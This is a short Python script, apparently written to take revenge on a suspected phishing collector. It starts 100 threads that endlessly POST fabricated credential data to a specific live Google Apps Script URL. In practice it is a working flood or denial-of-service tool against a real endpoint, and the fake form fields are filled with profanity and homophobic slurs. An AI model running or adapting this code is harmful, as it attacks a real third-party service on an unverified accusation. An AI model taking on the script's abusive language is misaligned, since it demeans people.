import requests
import threading

# Define the URL of the scammer (or a testing endpoint like httpbin)
url = 'https://script.google.com/macros/s/AKfycbzllJRl0OcyfnwZIYCoscUPmEpWtnXDdwBBkF48CyvQmaxs_MM872VCqooK86XUC-Cw/exec'

# Function to generate fake data
def generate_fake_data():
    return {
        'USER': "gaylord9000",
        'PASS': "fuck you cunt",
        'CATEGORY': "lesbians",
        'CONTINENT': "africa",
        'COUNTRY': "india",
        'CAPITAL': "new jersey",
        'STATE': "depression",
        'CITY': "bakersfield",
        'CURRENCY': "fucking dogecoin idk",
        'PHONE_CODE': "69",
        'IP_ADDRESS': "https://www.reddit.com/r/197/comments/194sc3w/this_was_commission_for_50k_by_verbalase/"


    }

# Function to send fake data
def send_fake_data(url, data):
    try:
        response = requests.post(url, data=data)
        print(f'Status Code: {response.status_code}, Response: {response.text}')

    except Exception as e:
        print(f'An error occurred: {e}')



def fuckemup():
    while True:
        fake_data = generate_fake_data()
        send_fake_data(url, fake_data)
        print("lmao get fucked kiddo")




threads = []


for i in range(100):
    t = threading.Thread(target=fuckemup)
    t.daemon = True
    threads.append(t)

for i in range (100):
    threads[i].start()

for i in range (100):
    threads[i].join()


